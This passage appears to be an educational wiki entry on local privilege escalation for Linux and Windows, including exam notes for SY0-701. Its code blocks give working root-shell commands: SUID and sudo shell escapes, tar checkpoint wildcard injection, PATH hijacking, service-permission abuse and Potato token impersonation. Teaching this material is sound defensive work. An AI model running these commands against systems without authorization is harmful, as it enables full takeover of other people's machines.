---
domain: "offensive-security"
tags: [privilege-escalation, post-exploitation, linux, windows, attack, lpe]
---
# Local Privilege Escalation

**Local Privilege Escalation (LPE)** is the act of leveraging a vulnerability, misconfiguration, or design flaw on a system where an attacker already holds limited access in order to gain higher privileges — typically from an unprivileged user to **root** on Unix-like systems or **SYSTEM/Administrator** on Windows. LPE is a critical phase in the [[Cyber Kill Chain]] and is codified in the [[MITRE ATT&CK]] framework under Tactic **TA0004: Privilege Escalation**, bridging initial access and full post-exploitation activities such as [[Credential Dumping]], [[Lateral Movement]], and [[Persistence]].

---

## Overview

Modern operating systems enforce a strict **privilege boundary** between unprivileged users and administrative accounts. This boundary is the operational implementation of the [[Principle of Least Privilege]]: user-level processes should not be able to read arbitrary memory, load kernel modules, modify system binaries, or access other users' data. Local privilege escalation defeats this boundary entirely. Unlike **remote** privilege escalation — which is achieved by attacking a network-facing service — LPE requires the attacker to already be executing code on the target machine. This code may run as a low-privileged shell user, a compromised service account, a web-shell identity like `www-data` or `IIS APPPOOL\DefaultAppPool`, or even a guest kiosk account.

LPE exists because the abstraction between user space and kernel space — and between ordinary accounts and the Trusted Computing Base — is porous in practice. Kernels are composed of tens of millions of lines of C code; setuid programs run with elevated privileges on behalf of unprivileged callers; services are installed with overly generous ACLs; administrators leave sudo rules, scheduled tasks, and service binaries in world-writable locations. Any of these conditions can be weaponized into a privilege boundary crossing. The Linux kernel alone has averaged dozens of privilege-escalation CVEs per year over the past decade, and the Windows ecosystem sees similar volumes of LPE patches each Patch Tuesday.

Real-world LPE is the norm, not the exception, in targeted intrusions. Ransomware operators including Conti, LockBit, and BlackCat routinely use LPE after an initial phishing compromise in order to deploy encryptors with SYSTEM-level rights. Advanced persistent threat actors chain LPE with sandbox escapes — for example, a browser renderer exploit (user-mode) combined with a Windows kernel LPE to escape Chrome's sandbox entirely. Commercial offensive-security toolkits such as Cobalt Strike, Metasploit, and Sliver include ready-made LPE modules, and projects like **LinPEAS**, **WinPEAS**, **PowerUp**, **BloodHound**, and **GTFOBins** have made comprehensive enumeration nearly push-button for attackers of all skill levels.

LPE is also central to security certifications and professional testing. The [[OSCP]] exam, HackTheBox machines, and internal penetration test reports all expect candidates to find and exploit at least one LPE path per target host. From a blue-team perspective, **assume breach** models treat LPE as inevitable and focus instead on detection through [[EDR]] products, [[Sysmon]], `auditd`, and kernel-integrity monitors that catch the behavioral patterns LPE leaves behind.

It is important to distinguish LPE from related but distinct concepts. **Horizontal** privilege movement — pivoting from user A to user B at the same privilege level — is access control abuse, not escalation. **UAC bypass** on Windows transitions a process from Medium to High Integrity for the *same* logged-in user account and is often categorized separately. **Container escape** or **VM escape** from a guest to a host is its own class of escalation with unique mechanics, though the underlying kernel exploitation techniques overlap substantially.

---

## How It Works

LPE techniques fall into several broad families, each exploiting a different trust assumption. In practice, an engagement follows an iterative loop: **enumerate → identify weakness → exploit → verify elevated context → stabilize**.

### 1. Kernel Exploits

The kernel runs at CPU ring 0 and is reachable from user space through system calls, `ioctl` interfaces, and pseudo-filesystems like `/proc` and `/sys`. A memory-corruption, race-condition, or logic bug in that interface can be turned into arbitrary kernel-mode code execution, at which point the attacker owns the system completely.

```bash
# Enumerate kernel version and distribution
uname -a
cat /etc/os-release

# Match against exploit databases
searchsploit "linux kernel 5.8"
```

Notable kernel LPE CVEs:

- **CVE-2016-5195 "Dirty COW"** — Race condition in the copy-on-write memory-mapping handler; allows a local user to write to any read-only file, including `/etc/passwd`. Exploitable on Linux 2.6.22–4.8.3.
- **CVE-2022-0847 "Dirty Pipe"** — Uninitialized `pipe_buffer.flags` in the pipe subsystem allows overwriting the contents of arbitrary read-only file-backed mappings. A five-line PoC achieves root.
- **CVE-2021-4034 "PwnKit"** — Off-by-one in `pkexec`'s argument parsing; present in virtually every Linux distribution for 12+ years; exploited by Qakbot and BlackBasta operators.
- **CVE-2023-32233** — Netfilter `nf_tables` use-after-free in the kernel networking subsystem; allows root from an unprivileged user namespace.

---

### 2. SUID/SGID and Capability Abuse

Binaries flagged with the `setuid` bit execute as their *owner* (typically root), not as the calling user. Any SUID-root binary that can spawn a shell, execute user-controlled arguments, or write to arbitrary files is an instant privilege escalation path.

```bash
# Find all SUID and SGID binaries on the system
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Find binaries with Linux capabilities assigned
getcap -r / 2>/dev/null

# Exploit: /usr/bin/find has SUID set
find . -exec /bin/sh -p \; -quit

# Exploit: python3 has cap_setuid capability
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Linux **capabilities** decompose root into ~40 discrete units. Granting `CAP_SETUID`, `CAP_DAC_READ_SEARCH`, or `CAP_SYS_ADMIN` to a binary is functionally equivalent to granting root access. Consult **GTFOBins** (`gtfobins.github.io`) for documented shell-escape techniques for every common Unix binary.

---

### 3. Sudo Misconfiguration

`sudoers` entries that permit `NOPASSWD` execution of any binary capable of spawning a shell, reading arbitrary files, or writing to the filesystem are among the most common real-world LPE paths.

```bash
# List allowed sudo commands for current user
sudo -l

# Abuse common editors and interpreters
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo perl -e 'exec "/bin/sh";'
sudo python3 -c 'import pty; pty.spawn("/bin/sh")'

# CVE-2021-3156 "Baron Samedit" — heap overflow in sudo itself
# Affects sudo < 1.9.5p2; exploitable even with no sudoers entry
```

---

### 4. Cron, Path, and Wildcard Hijacking

Scripts executed by the root cron daemon that reference binaries with relative paths, or use shell wildcards in dangerous ways, let attackers inject arbitrary commands.

```bash
# If /etc/crontab contains:
# * * * * * root cd /opt/backup && tar czf backup.tar.gz *
# An attacker with write access to /opt/backup can inject checkpoint arguments:

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /opt/backup/shell.sh
chmod +x /opt/backup/shell.sh
touch /opt/backup/--checkpoint=1
touch "/opt/backup/--checkpoint-action=exec=sh shell.sh"
# Wait for cron to run, then:
/tmp/rootbash -p    # -p preserves EUID 0
```

**PATH hijacking** targets scripts that call programs without absolute paths:

```bash
# Root script calls: cleanup (no path)
# Attacker controls $PATH:
echo '/bin/sh' > /tmp/cleanup
chmod +x /tmp/cleanup
export PATH=/tmp:$PATH
```

---

### 5. Windows Service and Registry Abuse

On Windows, the most common LPE vectors target service configuration and registry keys:

```powershell
# Check user privileges
whoami /priv
whoami /groups

# Unquoted service path
# If service path is: C:\Program Files\My Service\svc.exe
# Windows will try C:\Program.exe first if it exists in a writable location
wmic service get name,pathname,startmode | findstr /v '"' | findstr /i "auto"

# Weak service binary permissions
icacls "C:\Program Files\VulnerableApp\service.exe"
# If BUILTIN\Users has (F) or (W), overwrite with a malicious binary

# AlwaysInstallElevated — installs any MSI as SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerUp automation
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

---

### 6. Token Impersonation and the Potato Family

Windows service accounts (IIS, MSSQL, network services) are commonly granted `SeImpersonatePrivilege`. This token allows adopting any more-privileged token obtained via named pipe or RPC — the underlying mechanism for the entire **Potato** exploit family.

```powershell
# Check for the golden privilege
whoami /priv | findstr "SeImpersonate"

# PrintSpoofer — works on Windows 10 / Server 2019
PrintSpoofer64.exe -i -c cmd.exe

# GodPotato — broadest Windows version compatibility
GodPotato.exe -cmd "cmd /c whoami > C:\temp\result.txt"

# RoguePotato, JuicyPotato (older systems)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

---

### 7. BYOVD — Bring Your Own Vulnerable Driver

Attackers load a legitimately-signed but vulnerable kernel driver to gain ring-0 execution, bypassing Windows Driver Signature Enforcement. This is used primarily to terminate EDR sensor processes from kernel mode.

Notable vulnerable drivers weaponized in the wild:

| Driver | CVE | Used By |
|---|---|---|
| `RTCore64.sys` | CVE-2019-16098 | Scattered Spider, Lazarus |
| `gdrv.sys` | CVE-2018-19320 | Multiple ransomware operators |
| `capcom.sys` | — | Proof-of-concept, CTF |
| `iqvw64e.sys` | CVE-2015-2291 | BlackByte |

---

## Key Concepts

- **SUID/SGID bit**: Unix permission modes (`4000`/`2000`) causing a binary to execute with the UID/GID of its owner rather than its invoking user. Foundational enumeration target; cross-reference every hit against GTFOBins.
- **Linux capabilities**: Fine-grained decomposition of root privileges into ~40 independent units (e.g., `CAP_SYS_ADMIN`, `CAP_NET_RAW`, `CAP_SETUID`). Assigning capabilities such as `CAP_SETUID` or `CAP_DAC_READ_SEARCH` to an interpreter is functionally equivalent to granting root.
- **Token impersonation**: A Windows thread holding `SeImpersonatePrivilege` can legally assume the security context of a more-privileged token received via named pipe, COM activation, or RPC — the core mechanic of the Potato family.
- **Windows Integrity Levels**: Labels (Low / Medium / High / System) applied to every process. UAC transitions a user from Medium → High Integrity; full LPE to SYSTEM crosses from any level to System Integrity.
- **GTFOBins / LOLBAS**: Curated reference databases listing how legitimate Unix (`gtfobins.github.io`) and Windows (`lolbas-project.github.io`) binaries can be abused for privilege escalation, file write/read, and shell spawning when invoked in a privileged context.
- **BYOVD (Bring Your Own Vulnerable Driver)**: Technique of loading a signed-but-vulnerable kernel driver to attain ring-0 code execution, frequently used to blind EDR solutions from kernel space.
- **TOCTOU (Time-of-Check-to-Time-of-Use)**: A race condition class where the state of a resource changes between the security check and the use of that resource. Dirty COW is the archetype.
- **Weak ACLs on services**: When a service binary, its directory, or its registry key grants write access to unprivileged users, the binary can be replaced or the registry path redirected to attacker-controlled code executed as SYSTEM.

---

## Exam Relevance

**SY0-701** addresses LPE primarily within **Domain 2: Threats, Vulnerabilities, and Mitigations** and **Domain 4: Security Operations**. Key exam-relevant points:

- **Vertical vs. Horizontal escalation**: Vertical = crossing a privilege tier (user → root/SYSTEM). Horizontal = moving between accounts at the same tier. The exam expects you to know both terms and distinguish them cleanly.
- **Underlying vulnerability classes**: Expect questions mapping LPE to root causes — **buffer overflow**, **race condition**, **TOCTOU**, **improper input validation**, and **misconfigured permissions** all appear as answer choices.
- **Mitigations mapped to attacks**: The exam frequently presents a scenario and asks you to identify the correct countermeasure. For LPE: **Patch management**, **Principle of Least Privilege**, **application allowlisting**, **mandatory access control**, **PAM tools** (CyberArk, BeyondTrust), and **EDR** are all correct-answer material.
- **UAC and Integrity Levels**: Know that UAC is a *mitigation*, not a *security boundary* — Microsoft explicitly states UAC is not a privilege escalation defense; it is a convenience feature to prevent accidental elevation. UAC bypass is therefore categorized as escalation within the same user, not LPE to SYSTEM.
- **Mobile LPE**: **Rooting** (Android) and **jailbreaking** (iOS) are classified as LPE in a mobile context; expect mobile scenario questions where the threat vector is a malicious app exploiting a kernel flaw to gain root.

> **Gotcha #1**: The exam treats **Pass-the-Hash** and **Kerberoasting** as credential-access or lateral-movement attacks, not LPE — even if the result is elevated access. Do not conflate them.
>
> **Gotcha #2**: A question describing a user who can "write to a script that runs as root in a scheduled task" is describing an **insecure permissions / privilege escalation** scenario — the correct mitigation is always **restrict file system permissions and enforce least privilege**, not just "apply patches."

---

## Security Implications

LPE converts a low-impact foothold into full host compromise, enabling every subsequent post-exploitation activity:

- **Credential theft**: With SYSTEM/root, an attacker can read `/etc/shadow`, dump LSASS memory with Mimikatz, extract SAM and SYSTEM hive backups, or query the Windows Credential Manager and browser-stored credentials.
- **Persistence**: Root-level code can install kernel modules (LKMs), rootkits